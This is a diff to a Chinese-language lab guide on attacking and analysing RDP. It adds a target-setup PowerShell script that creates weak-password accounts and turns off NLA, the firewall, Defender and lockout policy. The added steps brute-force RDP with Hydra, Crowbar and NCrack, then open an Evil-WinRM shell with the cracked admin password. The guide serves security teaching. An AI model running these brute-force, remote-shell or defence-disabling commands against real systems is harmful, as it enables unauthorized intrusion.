@@ -158,7 +158,50 @@ Windows安全日志中RDP相关的关键事件ID：
 
 **靶机初始化脚本**（管理员PowerShell执行）：
 
+```powershell
 # ============================================
+# 实验五 靶机初始化脚本
+# 以管理员身份运行 PowerShell 执行
+# ============================================
+
+# 1. 创建测试用户
+net user rdpuser1 '123456' /add
+net user rdpuser2 'P@ssw0rd123' /add
+net user rdpuser3 'admin@123' /add
+net user rdpadmin 'admin@123' /add
+
+# 2. 将 rdpadmin 加入管理员组
+net localgroup Administrators rdpadmin /add
+
+# 3. 将所有用户加入 Remote Desktop Users 组
+net localgroup "Remote Desktop Users" rdpuser1 /add
+net localgroup "Remote Desktop Users" rdpuser2 /add
+net localgroup "Remote Desktop Users" rdpuser3 /add
+net localgroup "Remote Desktop Users" rdpadmin /add
+
+# 4. 启用远程桌面
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
+    -Name "fDenyTSConnections" -Value 0
+
+# 5. 关闭 NLA（网络级身份验证），使 Hydra 可以爆破
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
+    -Name "UserAuthentication" -Value 0
+
+# 6. 关闭 Windows 防火墙（仅实验环境）
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# 7. 设置密码策略：无复杂度要求，无锁定阈值
+net accounts /minpwlen:0 /maxpwage:unlimited /minpwage:0 /lockoutthreshold:0
+secedit /export /cfg C:\secpol.cfg
+(Get-Content C:\secpol.cfg).Replace("PasswordComplexity = 1", "PasswordComplexity = 0") | Set-Content C:\secpol.cfg
+secedit /configure /db C:\Windows\Security\local.sdb /cfg C:\secpol.cfg /areas SECURITYPOLICY
+Remove-Item C:\secpol.cfg -Force
+
+# 8. 关闭 Defender 实时监控（避免干扰实验工具）
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+Write-Host "[+] 靶机初始化完成！RDP已启用，NLA已关闭，防火墙已关闭。" -ForegroundColor Green
+```
 
 ---
 
@@ -206,9 +249,11 @@ nmap -p- --script rdp-ntlm-info 192.168.1.20
 
 **步骤3：检测NLA是否启用**
 
-使用CrackMapExec检测NLA状态
+使用CrackMapExec检测NLA状态：
 
+```bash
 crackmapexec rdp 192.168.1.20
+```
 
 > **知识关联**：对应讲义中”网络级身份验证（NLA）“——NLA要求在建立完整RDP会话前先完成身份验证，关闭NLA则允许攻击者进行更多攻击。
 > 
@@ -246,11 +291,20 @@ hydra -L /tmp/rdp_users.txt -P /tmp/rdp_passwords.txt rdp://192.168.1.20 -t 4 -v
 
 **步骤5：使用Crowbar进行RDP爆破**
 
-# Crowbar支持RDP爆破-b rdp -s 192.168.1.20/32 -U /tmp/rdp_users.txt -C /tmp/rdp_passwords.txt -n 1
+```bash
+# Crowbar支持RDP爆破
+crowbar -b rdp -s 192.168.1.20/32 -U /tmp/rdp_users.txt -C /tmp/rdp_passwords.txt -n 1
+```
 
 **步骤6：使用NCrack进行RDP爆破**
 
-ncrack -vv –user rdpuser1 –pass 123456 rdp://192.168.1.20-vv -U /tmp/rdp_users.txt -P /tmp/rdp_passwords.txt rdp://192.168.1.20
+```bash
+# 针对单个用户的爆破
+ncrack -vv --user rdpuser1 --pass 123456 rdp://192.168.1.20
+
+# 使用字典文件批量爆破
+ncrack -vv -U /tmp/rdp_users.txt -P /tmp/rdp_passwords.txt rdp://192.168.1.20
+```
 
 > **知识关联**：对应讲义中”弱口令风险”——没有账户锁定策略时，暴力破解可以无限制尝试。
 > 
@@ -263,7 +317,19 @@ ncrack -vv –user rdpuser1 –pass 123456 rdp://192.168.1.20-vv -U /tmp/rdp_use
 
 从Kali攻击机通过已获取的凭据查询靶机的活动会话：
 
-# 使用CrackMapExec查询rdp 192.168.1.20 -u rdpadmin -p ‘admin@123’ –sessions# 使用Evil-WinRM执行远程命令-winrm -i 192.168.1.20 -u rdpadmin -p ‘admin@123’# 在远程Shell中执行：# 查看当前登录的会话user # 查询已登录用户
+```bash
+# 使用CrackMapExec查询
+crackmapexec rdp 192.168.1.20 -u rdpadmin -p ‘admin@123’ --sessions
+
+# 使用Evil-WinRM执行远程命令
+evil-winrm -i 192.168.1.20 -u rdpadmin -p ‘admin@123’
+
+# 在远程Shell中执行：
+# 查看当前登录的会话
+quser
+# 查询已登录用户
+query user
+```
 
 **步骤8：分析RDP日志（从靶机侧）**
 
